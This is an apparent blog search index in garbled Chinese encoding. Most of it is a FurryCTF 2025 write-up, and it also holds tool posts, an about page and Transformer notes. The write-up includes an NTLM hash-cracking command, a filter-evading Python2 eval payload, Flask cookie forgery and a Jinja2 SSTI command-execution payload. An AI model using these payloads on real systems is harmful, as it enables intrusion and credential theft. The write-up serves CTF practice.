[{"categories":["ç½‘å®‰"],"content":"Lunatic å¤§ä½¬çš„ CTF-Misc Guide Hello CTF ","date":"2026-01-19","objectID":"/posts/ctf-misc/:0:0","tags":["CTF","Misc"],"title":"Misc æ•™ç¨‹å‚è€ƒ","uri":"/posts/ctf-misc/"},{"categories":["ç½‘å®‰"],"content":"çƒ­èº«èµ› çƒ­èº«èµ›é“¾æ¥ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:1:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Misc ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:2:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"IISæœåŠ¡å™¨ é¦–å…ˆä½¿ç”¨ WiresHark æ‰“å¼€ã€‚ æ–‡ä»¶ -\u003e å¯¼å‡ºå¯¹è±¡ -\u003e HTTPï¼š æ‰¾åˆ° f12g.txt æ‰“å¼€å‘ç°å¯†æ–‡ï¼š ZnVycnlDVEZ7RGlkX1lvdV9Ob3RlX1RoZV9EaWZmX0luX0Vycm9yX1BhZ2U/fQ== Base64 è§£å¯†å³å¯ã€‚ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:2:1","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"PassDump æ³¨æ„åˆ°æ˜¯ dmp æ–‡ä»¶ï¼Œä½¿ç”¨ WinDbg æ‰“å¼€ã€‚ æ‰§è¡Œå‘½ä»¤ !analyze -v çœ‹ä¸€ä¸‹æ—¥å¿—ï¼Œæ˜¯ nvlddmkm.sys æ˜¾å¡é©±åŠ¨æ–‡ä»¶å¯¼è‡´çš„è“å±é—®é¢˜ã€‚ å…¶ä¸­é”™è¯¯ä»£ç ä¸º 116ï¼Œè¿™ä¸ªæ—¶é—´ä¸ºè¶…æ—¶æ£€æµ‹å’Œæ¢å¤ (Timeout Detection and Recovery) ç®€ç§° TDR æ‰§è¡Œå‘½ä»¤ lm v m nvlddmkm æŸ¥çœ‹æœ€åä¸€æ¬¡ç¼–è¯‘æ—¶é—´ã€‚ Timestamp è¿™ä¸€è¡Œå°±æ˜¯æ—¶é—´ã€‚ è‡³äºæ­£åœ¨ä½¿ç”¨çš„ç¨‹åºï¼Œæˆ‘çŒœçš„ Hashcatï¼ŒçŒœå¯¹äº†ï¼ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:2:2","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"ç›²ç›’ é¦–å…ˆæ‰“å¼€ excelï¼ŒæŠŠå†…å®¹å…¨å¤åˆ¶å‡ºæ¥ï¼Œå‘ç°æ²¡æœ‰ flag äºæ˜¯å°†ä»–åç¼€æ”¹ä¸º .zipï¼Œè§£å‹ï¼Œåœ¨ xl/sharedStrings.xml å‘ç°é›¶å®½éšå†™ã€‚ è§£å¯† ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:2:3","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Miscode é¦–å…ˆæ‰“å¼€ .gitattributes å‘ç°å†…å®¹å¦‚ä¸‹ï¼š *.php linguist-language=7b *.swift linguist-language=61 *.scala linguist-language=48 *.py linguist-language=66 *.erl linguist-language=76 *.c linguist-language=72 *.f90 linguist-language=47 *.kt linguist-language=37 *.rb linguist-language=53 *.lua linguist-language=57 *.cs linguist-language=69 *.go linguist-language=43 *.m linguist-language=31 *.js linguist-language=74 *.ex linguist-language=36 *.pl linguist-language=31 *.clj linguist-language=68 *.vb linguist-language=5f *.sh linguist-language=46 *.cpp linguist-language=79 *.r linguist-language=21 *.ml linguist-language=7d *.ts linguist-language=5f *.hs linguist-language=6c *.java linguist-language=75 *.rs linguist-language=54 ç„¶åè¿˜æœ‰ä¸€å †éšæœºæ–‡ä»¶ã€‚ æœç´¢å‘ç°è¿™æ˜¯ä¸ªå°†æŸä¸ªè¯­è¨€åç¼€åç»Ÿè®¡ä¸ºè‡ªå®šä¹‰åç§°çš„ä¸œè¥¿ã€‚ äºæ˜¯ç»“åˆ GitHub æ­¤æ–‡ä»¶çš„ç”¨å¤„ï¼ŒçŒœæµ‹æ˜¯ç»Ÿè®¡æ–‡ä»¶åç¼€çš„é¢‘ç‡ï¼Œç„¶åæ’åºã€‚ æœ€ç»ˆç”¨ python å†™ä¸ªè„šæœ¬ï¼Œç”¨ hex è§£å‡ºæ¥ linguist-language çš„å¯¹åº”å¯†æ–‡å³å¯ã€‚ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:2:4","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Crypto ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:3:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"SAM è§£å‹æ–‡ä»¶ï¼Œå‘ç°ç›®å½•ä¸‹æœ‰ä¸€ä¸ª SAM æ–‡ä»¶è¿˜æœ‰ä¸€ä¸ª SYSTEM æ–‡ä»¶ã€‚ åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œå¯†ç å¹¶ä¸æ˜¯ä»¥æ˜æ–‡å­˜å‚¨çš„ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ˆRegistry Hivesï¼‰ä¸­ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯æå–æœ¬åœ°è´¦æˆ·å¯†ç çš„æœ€ä½é…ç½®ï¼š SAM(Security Accounts Manager)ï¼šå­˜å‚¨æœ¬åœ°ç”¨æˆ·çš„è´¦æˆ·ä¿¡æ¯ã€ç»„ä¿¡æ¯ä»¥åŠæœ€é‡è¦çš„ NTLM/LM å¯†ç å“ˆå¸Œã€‚ SYSTEM(System Hive)ï¼šå­˜å‚¨äº†ç³»ç»Ÿçš„å¯åŠ¨ä¿¡æ¯ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œå®ƒåŒ…å«äº†ç”¨äºè§£å¯† SAM æ–‡ä»¶ä¸­å“ˆå¸Œå€¼çš„ Boot Keyï¼ˆSyskeyï¼‰ å¼€ä¸€ä¸‹ WSLï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ samdump2 SYSTEM SAM furryCTF è´¦æˆ·å¯†ç çš„ NTLM åŠ å¯†å°±æ˜¯ï¼š æ³¨æ„ 861bd8bac91cac40013172f47ab784a4 é¢˜é¢æè¿°åˆ°ä»–çš„å¯†ç å½¢å¼ä¸º ?l?l?l?l?l?s......ï¼ˆæœ€åä¸‰ä½å¿˜äº†.jpgï¼‰ æ‰€ä»¥ä½¿ç”¨ Hashcat è¿›è¡Œæ©ç æ”»å‡»ã€‚ hashcat -m 1000 -a 3 861bd8bac91cac40013172f47ab784a4 ?l?l?l?l?l?s?a?a?a ç”±äºæ•°é‡çº§å¾ˆé«˜ï¼Œæˆ‘çš„æ˜¾å¡å’Œ CPUå¤ªåƒåœ¾äº†ï¼Œäºæ˜¯ç§Ÿä¸€å° 5090 åœ¨ 4min å°±çˆ†ç ´å‡ºæ¥äº†ï¼ å¯†ç æ˜¯ robin@0w0 ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:3:1","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Web ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:4:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"DeepSleep å‘ç°é¢˜ç›®æ‰€ç»™çš„ä»£ç ä¸­æœ‰ Python2 æ³¨å…¥æ¼æ´ (RCE) question = input(\"\").decode('utf-8') åœ¨ Python2 ä¸­ input() ç­‰åŒäº eval(raw_input())ï¼Œå®ƒä¼šå°è¯•å°†è¾“å…¥çš„å†…å®¹ä½œä¸º Python è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼ã€‚ æµ‹è¯•ä¸€ä¸‹ï¼š å‘ç°å¾—åˆ°äº† 246ï¼Œè¯´æ˜å­˜åœ¨æ¼æ´ã€‚ é‚£ä¹ˆæ„é€  Payloadï¼š str(getattr(getattr(__builtins__, 'ope' + 'n')('fl' + 'ag'), 're' + 'ad')().encode('hex')) open() æ˜¯ __builtins__ æ¨¡å—é‡Œçš„ä¸€ä¸ªå±æ€§ï¼Œé€šè¿‡åå°„æœºåˆ¶ getattr() é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¯ä»¥é¿å¼€é™æ€æ‰«æã€‚ ç„¶åæŠŠ open å’Œ flag æ‹†å¼€å¯ä»¥é¿å…å…³é”®è¯æ£€æµ‹ã€‚ .encode('hex') å¯ä»¥é¿å…åç«¯ä¼šæ£€æŸ¥æ‰§è¡Œç»“æœæ˜¯å¦åŒ…å« furryCTF{} ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:4:1","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"å›ºè‹¥é‡‘æ±¤ é¢˜é¢æç¤ºåˆ° dirsearch æœ‰æƒŠå–œï¼Œæ‰«ä¸€ä¸‹ï¼š æ˜¯ Git æºç æ³„éœ²ã€‚ ä½¿ç”¨ Githack å°†æºç æ‹‰ä¸‹æ¥ï¼Œå‘ç°äº† app.py å’Œ config.py import os # Auto-generated by KMS rotation service SECRET_KEY = os.urandom(32) SECRET_KEY_FALLBACKS = [\"This_key_has_been_deprecated_v2023\"] SECRET_KEY ä½¿ç”¨äº† os.urandom(32)ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡åº”ç”¨é‡å¯ï¼Œå¯†é’¥éƒ½ä¼šå˜ï¼Œæˆ‘ä»¬æ— æ³•é¢„æµ‹å½“å‰çš„å¯†é’¥ã€‚ å¼€å‘è€…ç•™äº†ä¸€ä¸ªåé—¨ SECRET_KEY_FALLBACKSï¼Œé‡Œé¢åŒ…å«äº†ä¸€ä¸ªç¡¬ç¼–ç çš„å­—ç¬¦ä¸²ï¼šThis_key_has_been_deprecated_v2023 åœ¨ Flask çš„æŸäº›é…ç½®æˆ–æ—§ç‰ˆæœ¬å…¼å®¹å®ç°ä¸­ï¼Œç³»ç»Ÿå¾€å¾€ä¼šå…è®¸ä½¿ç”¨ FALLBACKS ä¸­çš„æ—§å¯†é’¥æ¥éªŒè¯ Sessionã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä¼ªé€  cookie app.py ä¸­çš„å…³é”®ä¿¡æ¯ï¼š è¿™æ˜¯ä¸€ä¸ªæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ (SSTI) åªè¦ Session ä¸­åŒ…å« {'role': 'admin'}ï¼Œå°±å¯ä»¥éªŒè¯ã€‚ ä½¿ç”¨ flask-unsign å·¥å…·ä¼ªé€  cookie C:\\Users\\10927\u003eflask-unsign --sign --cookie \"{'role': 'admin'}\" --secret \"This_key_has_been_deprecated_v2023\" eyJyb2xlIjoiYWRtaW4ifQ.aVtslQ.eWu6ElOxsMyhyeYaIoMeOVDq-lM åœ¨ F12 cookie é‡Œé¢æ·»åŠ ä¸€ä¸ªé”®åä¸º session é”®å€¼ä¸º eyJyb2xlIjoiYWRtaW4ifQ.aVtslQ.eWu6ElOxsMyhyeYaIoMeOVDq-lM çš„ã€‚ å‘ç°å·²ç»éªŒè¯ä¸ºäº†ç®¡ç†å‘˜ï¼š æ„é€  Payload http://ctf.furryctf.com:32780/?u={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}} ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:4:2","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Reverse ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:5:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"çŒœæ•°å­— æ‰“å¼€ IDA Proï¼ŒShift + F12 æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:5:1","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"OSINT ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:6:0","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["ç½‘å®‰"],"content":"Osint master å³ä¸‹è§’å¯ä»¥çœ‹å‡ºæ˜¯éƒ½æ±Ÿå °ï¼Œç„¶åæ ¹æ®æç¤ºå’Œ AIï¼Œé”å®šäº†é²¤é±¼æ²±å¤§æ¡¥ ç„¶åç™¾åº¦åœ°å›¾éšä¾¿æ‰¾æ‰¾ï¼Œæ‰¾åˆ°äº†åœ°ç‚¹ã€‚ ","date":"2026-01-04","objectID":"/posts/ctf-furryctf-2025/:6:1","tags":["CTF"],"title":"FurryCTF 2025 WP","uri":"/posts/ctf-furryctf-2025/"},{"categories":["å¼€å‘"],"content":"\u003c!DOCTYPE html\u003e ğŸ“· é€‰æ‹©ç…§ç‰‡ ä¸»é¢˜ 1ï¼šæš—è‰²ç”µå½±æ„Ÿ (é»‘æ¡) ä¸»é¢˜ 2ï¼šæç®€ç”»å»Šé£ (ç™½æ¡†) Logo å¤§å° æ–‡å­—å¤§å° ç­‰å¾…ä¸Šä¼ ç…§ç‰‡... ä¸‹è½½ ","date":"2025-12-03","objectID":"/posts/develop%E8%8B%B9%E6%9E%9C%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90/:0:0","tags":["å·¥å…·"],"title":"è‹¹æœæ°´å°ç”Ÿæˆ","uri":"/posts/develop%E8%8B%B9%E6%9E%9C%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90/"},{"categories":["åšå®¢"],"content":"shortcodes ä»…æ”¯æŒå•ä½“ HTML æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ª Vue ç»„ä»¶è®©ä»–æ‰“åŒ…ä¸ºå•ä½“æ–‡ä»¶ã€‚ åœ¨ Vue é¡¹ç›®ä¸­å®‰è£… vite-plugin-singlefile ç»„ä»¶ï¼š npm install vite-plugin-singlefile --save-dev åœ¨ vite.config.ts é…ç½®ï¼š import { defineConfig } from 'vite'; import vue from '@vitejs/plugin-vue'; import { viteSingleFile } from 'vite-plugin-singlefile'; export default defineConfig({ plugins: [vue(), viteSingleFile()], }); æ‰“åŒ…ï¼š npm run build ","date":"2025-07-27","objectID":"/posts/blog-vue3-%E6%89%93%E5%8C%85-shortcodes/:0:0","tags":["åšå®¢ shortcodes"],"title":"Vue3 é¡¹ç›®æ‰“åŒ…ä¸º shortcodes æµç¨‹","uri":"/posts/blog-vue3-%E6%89%93%E5%8C%85-shortcodes/"},{"categories":["å¼€å‘"],"content":"\u003c!doctype html\u003e æ—¥æŠ¥/å‘¨æŠ¥ç”Ÿæˆå·¥å…· GitHub åœ°å€ ","date":"2025-07-27","objectID":"/posts/develop%E6%97%A5%E6%8A%A5%E5%91%A8%E6%8A%A5%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/:0:0","tags":["å·¥å…·"],"title":"æ—¥æŠ¥/å‘¨æŠ¥ç”Ÿæˆå·¥å…·","uri":"/posts/develop%E6%97%A5%E6%8A%A5%E5%91%A8%E6%8A%A5%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"},{"categories":["ç”µå­ä¹¦"],"content":"https://a0gzq66o4t.feishu.cn/docx/PWZGdXGDgonKYyx3dmbcZe3Wn0c?from=from_copylink ","date":"2025-07-24","objectID":"/posts/e-book%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B/:0:0","tags":null,"title":"è®¡ç½‘è‡ªé¡¶å‘ä¸‹","uri":"/posts/e-book%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B/"},{"categories":null,"content":"åŸºæœ¬ä¿¡æ¯ ","date":"2025-07-24","objectID":"/about/:1:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"ç›®å‰å¸¸é©»ä½ç½®ï¼šå±±ä¸œæµå— ","date":"2025-07-24","objectID":"/about/:1:1","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"å¹´é¾„ \u003c!DOCTYPE html\u003e å¹´é¾„è®¡ç®—å™¨ æˆ‘çš„å¹´é¾„ 23å² è·ç¦»ä¸‹ä¸€ä¸ªç”Ÿæ—¥è¿˜æœ‰: -- å¤© 0 å¹´ 0 æœˆ 0 å¤© 0 å°æ—¶ ","date":"2025-07-24","objectID":"/about/:1:2","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"å­¦å† è¿›å…¥PHVsC9d959e2e32c57d847112c3f1d317ce69a97196ce1cf662836537979770biAgY2xhc3M9ImZpLXRpbWVsaW5lIgogID48bGkKICAgICAgY2xhc3M9ImZpLXRpbWVsaW5lLWl0ZW0iCiAgICAgIGRhdGEtc2l6ZT0ibWVkaXVtIgogICAgICBkYXRhLW5vZGU9ImNpcmNsZSIKICAgICAgc3R5bGU9Ii0tdGltZWxpbmUtaW5kZXg6IDE7Ij48ZGl2IGNsYXNzPSJmaS10aW1lbGluZS1pdGVtX19jb250ZW50Ij7lsbHkuJzluIjojIPlpKflrabpmYTlsZ7lsI/lrabvvIjpm4XlsYXlm63moKHljLrvvIk8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmaS10aW1lbGluZS1pdGVtX190aW1lc3RhbXAgaXMtYm90dG9tIj4yMDA4fjIwMTQ8L2Rpdj48L2xpPjxsaQogICAgICBjbGFzcz0iZmktdGltZWxpbmUtaXRlbSIKICAgICAgZGF0YS1zaXplPSJtZWRpdW0iCiAgICAgIGRhdGEtbm9kZT0iY2lyY2xlIgogICAgICBzdHlsZT0iLS10aW1lbGluZS1pbmRleDogMjsiPjxkaXYgY2xhc3M9ImZpLXRpbWVsaW5lLWl0ZW1fX2NvbnRlbnQiPuWxseS4nOW4iOiMg+Wkp+Wtpum9kOmygeWunumqjOWtpuagoTwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZpLXRpbWVsaW5lLWl0ZW1fX3RpbWVzdGFtcCBpcy1ib3R0b20iPjIwMTR+MjAxNzwvZGl2PjwvbGk+PGxpCiAgICAgIGNsYXNzPSJmaS10aW1lbGluZS1pdGVtIgogICAgICBkYXRhLXNpemU9Im1lZGl1bSIKICAgICAgZGF0YS1ub2RlPSJjaXJjbGUiCiAgICAgIHN0eWxlPSItLXRpbWVsaW5lLWluZGV4OiAzOyI+PGRpdiBjbGFzcz0iZmktdGltZWxpbmUtaXRlbV9fY29udGVudCI+5bGx5Lic55yB5a6e6aqM5Lit5a2m77yI5Lic5qCh77yJPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZmktdGltZWxpbmUtaXRlbV9fdGltZXN0YW1wIGlzLWJvdHRvbSI+MjAxN34yMDIwPC9kaXY+PC9saT48bGkKICAgICAgY2xhc3M9ImZpLXRpbWVsaW5lLWl0ZW0iCiAgICAgIGRhdGEtc2l6ZT0ibWVkaXVtIgogICAgICBkYXRhLW5vZGU9ImNpcmNsZSIKICAgICAgc3R5bGU9Ii0tdGltZWxpbmUtaW5kZXg6IDQ7Ij48ZGl2IGNsYXNzPSJmaS10aW1lbGluZS1pdGVtX19jb250ZW50Ij7lsbHkuJznkIblt6XlpKflraYg6L2v5Lu25bel56iL5LiT5LiaPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZmktdGltZWxpbmUtaXRlbV9fdGltZXN0YW1wIGlzLWJvdHRvbSI+MjAyMH4yMDI0PC9kaXY+PC9saT48L3VsPg== ","date":"2025-07-24","objectID":"/about/:1:3","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"è”ç³»æ–¹å¼ è”ç³»æ–¹å¼ è´¦å·ä¿¡æ¯ QQ 1092718960 å¾®ä¿¡ messywind10 é‚®ç®± 1092718960@qq.com messywind1@gmail.com ","date":"2025-07-24","objectID":"/about/:2:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"ç¤¾äº¤å¸å· å¹³å° åç§°/é“¾æ¥ ç¤¾äº¤å¹³å° Github messywind çŸ¥ä¹ å‡Œä¹±ä¹‹é£â€‹ bilibili å‡Œä¹±ä¹‹é£_ æŠ–éŸ³ Messywind1 å°çº¢ä¹¦ messywind å¾®åš å‡Œä¹±ä¹‹é£_ ç™¾åº¦è´´å§ å‡Œä¹±ä¹‹é£ X (twitter) MessyWind Discord messywind Telegram messywind ç®—æ³•ç«èµ› codeforces https://codeforces.com/team/117733 Atcoder https://atcoder.jp/users/messywind æ´›è°· https://www.luogu.com.cn/user/133351 æ¸¸æˆ è‹±é›„è”ç›Ÿ ç½‘ 1/3/6 åŒºï¼šå‡Œä¹±ä¹‹é£#37145 ç”µ 1ï¼šå‡Œä¹±ä¹‹é£#73293 æ— ç•å¥‘çº¦ å›½æœï¼šå‡Œä¹±ä¹‹é£#4531 Steam å‡Œä¹±ä¹‹é£ ç½‘æ˜“æš´é›ª ç‚‰çŸ³ä¼ è¯´/å®ˆæœ›å…ˆé”‹ï¼šå‡Œä¹±ä¹‹é£#51173 ","date":"2025-07-24","objectID":"/about/:3:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ ¸å¿ƒè®ºæ–‡ï¼šAttention Is All You Need ","date":"2025-06-10","objectID":"/posts/mltransformer/:1:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"ç»“æ„ ","date":"2025-06-10","objectID":"/posts/mltransformer/:2:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"è¾“å…¥ ","date":"2025-06-10","objectID":"/posts/mltransformer/:3:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"embedding è¾“å…¥æ˜¯ç”±ä¸€å¥è¯åŒ…å«è‹¥å¹²ä¸ªå•è¯ç»„æˆï¼Œæˆ‘ä»¬ä¼šå°†å•è¯è¿›è¡Œ embeddingï¼Œä¹Ÿå°±æ˜¯è½¬æˆå‘é‡çš„å½¢å¼ï¼Œæ›´æ–¹ä¾¿å¤„ç†ã€‚ æ¯ä¸€ä¸ªå•è¯çš„å‘é‡è¡¨ç¤ºä¼šæœ‰å¾ˆå¤šç»´åº¦ï¼Œè®ºæ–‡é‡Œçš„ç»´åº¦ä¸º $d_m = 512$ è‹¥æŸä¸ªåºåˆ—é•¿åº¦å°äºæœ€é•¿çš„åºåˆ—é•¿åº¦ï¼Œåˆ™ç”¨ Padding Mask å¡«å……ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ \u003cpad\u003e æ ‡è®°å¡«å……ï¼Œä¾¿äºåºåˆ—å¯¹é½ã€‚ åœ¨è®­ç»ƒæ—¶ï¼Œè¾“å…¥åŒ…å«åŸå¥å­å’Œç¿»è¯‘åçš„å¥å­ï¼Œåˆ†åˆ«è¾“å…¥åˆ° Inputs å’Œ Outputsï¼Œå…¶ä¸­ Outputs éœ€è¦å³ç§»ä¸€ä½ï¼Œåœ¨å¥å­å¼€å§‹åŠ ä¸€ä¸ªæ ‡å¿— \u003cbegin\u003eï¼Œç”¨æ¥åç»­æ–¹ä¾¿å¤„ç†æ©ç ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:3:1","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Positional Encoding åœ¨ embedding ä¹‹åï¼Œéœ€è¦å¯¹å¥å­ä¸­æ¯ä¸ªè¯è¿›è¡Œä½ç½®ç¼–ç ï¼Œå› ä¸º Transformer ä¸åƒ RNN é‚£æ ·å¯ä»¥çŸ¥é“å•è¯çš„æ—¶åºä¿¡æ¯ï¼Œè¾“å…¥æ—¶æ˜¯ä¸€æ•´ä¸ªå¥å­ä½œä¸ºè¾“å…¥ã€‚ ä½ç½®ç¼–ç å…¬å¼å¦‚ä¸‹ï¼š $$ \\begin{aligned} \\text{PE}(\\text{pos}, 2i) \u0026= \\sin\\left(\\text{pos}\\times{10000^{-\\frac{2i}{d_m}}}\\right) \\\\ \\text{PE}(\\text{pos}, 2i + 1) \u0026= \\cos\\left(\\text{pos}\\times{10000^{-\\frac{2i}{d_m}}}\\right) \\end{aligned} $$ å…¶ä¸­ï¼Œpos è¡¨ç¤ºå•è¯åœ¨å¥å­ä¸­çš„ä½ç½®ï¼Œ$d_m$ è¡¨ç¤º embedding çš„ç»´åº¦ï¼Œ$2i$ è¡¨ç¤ºè¯¥ä½ç½®å•è¯çš„å¶æ•°ç»´åº¦ï¼Œ$2i + 1$ è¡¨ç¤ºè¯¥ä½ç½®å•è¯çš„å¥‡æ•°ç»´åº¦ã€‚ å¾—åˆ° PE ä¹‹åç›´æ¥ä¸è¯å‘é‡è¿›è¡Œç›¸åŠ ï¼Œå°±å®Œæˆäº†è¾“å…¥å¤„ç†éƒ¨åˆ†ã€‚ ","date":"2025-06-10","objectID":"/posts/mltransformer/:3:2","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ³¨æ„åŠ›æœºåˆ¶ ","date":"2025-06-10","objectID":"/posts/mltransformer/:4:0","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Self-Attention ç»“æ„ï¼š å…¬å¼ï¼š $$ \\text{Attention}(Q, K, V) = \\text{softmax}\\left(\\frac{QK^\\top}{\\sqrt{d_k}}\\right) V $$ å¯ä»¥ç†è§£ä¸º $Q$ æ˜¯æŸ¥è¯¢ï¼Œ$K$ æ˜¯é”®å€¼ï¼Œ$V$ æ˜¯å€¼ã€‚ é¦–å…ˆï¼Œéœ€è¦å°†è¾“å…¥çš„æ¯ä¸ªè¯å‘é‡åˆ†åˆ«ä¹˜ä¸Š $W_Q, W_K, W_V$ çŸ©é˜µæ‰å˜æˆ $Q, K, V$ï¼Œå…¶ä¸­ $W_Q, W_K, W_V$ æ˜¯å­¦ä¹ å‚æ•°ã€‚ ç„¶åå°† $Q$ å’Œ $K^\\top$ åšçŸ©é˜µä¹˜æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªåˆ†æ•°çŸ©é˜µï¼Œæ¯ä¸€åˆ—ç›¸å½“äºè¯¥å•è¯ä¸å„ä¸ªå•è¯åˆ†åˆ«åšå†…ç§¯ï¼Œå€¼è¶Šå¤§ï¼Œç›¸å…³åº¦è¶Šé«˜ã€‚ éšåå†å°†æ¯ä¸ªå€¼é™¤ä»¥ $\\sqrt{d_k}$ï¼Œè¿™ä¸ªæ˜¯çŸ©é˜µ $Q$ çš„ç»´åº¦ï¼Œå› ä¸ºé¿å…æ•°å€¼è¿‡å¤§å½±å“æ¢¯åº¦ã€‚ ä¹‹åå¯¹æ¯ä¸€åˆ—è¿›è¡Œ softmaxï¼Œè¿™æ ·åšçš„ç†ç”±æ˜¯ä½¿å¾—å€¼å½’ä¸€åŒ–ï¼Œ æœ€ç»ˆï¼Œå†ä¹˜ä¸Š $V$ï¼Œå¾—åˆ° attention ","date":"2025-06-10","objectID":"/posts/mltransformer/:4:1","tags":["Transformer"],"title":"Transformer","uri":"/posts/mltransformer/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"Multi-Head Attention ç»“æ„ï¼š Multi-Head Attention æ˜¯ç”±å¤šä¸ª Self-Attention ç»„åˆè€Œæˆï¼Œè¿™ä¹Ÿå«å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶ã€‚ å…¬å¼ï¼š $$ \\begin{aligned} \\text{MultiHead}(Q, K, V) \u0026= \\text{Concat}(\\text{head}_1, \\cdots, \\text{head}_h) W ^ O \\\\ \\text{where } \\text{head}_i \u0026= \\text{Attention}(QW_i^Q, KW_i^K, VW_i^V) \\end{aligned} $$ å…¶ä¸­å‚æ•° $W_i^Q, W_i^K \\in \\mathbb{R}^{d_m \\times d_k}, W_i^V \\in \\mathbb{R}^{d_m \\times d_v}, W ^ O \\in \\mathbb{R}^{h d_v \\times d_m}$ï¼Œ$h$ ä»£è¡¨å¤´çš„ä¸ªæ•°ã€‚ è®ºæ–‡é‡Œå– $h = 8$ï¼Œå°†è¾“å…¥åˆ†åˆ° $8$ ä¸ªå¤´ä¸­ï¼Œç”±åŸæ¥çš„ $512$ ç»´å˜æˆ $512 / 8 = 64$ 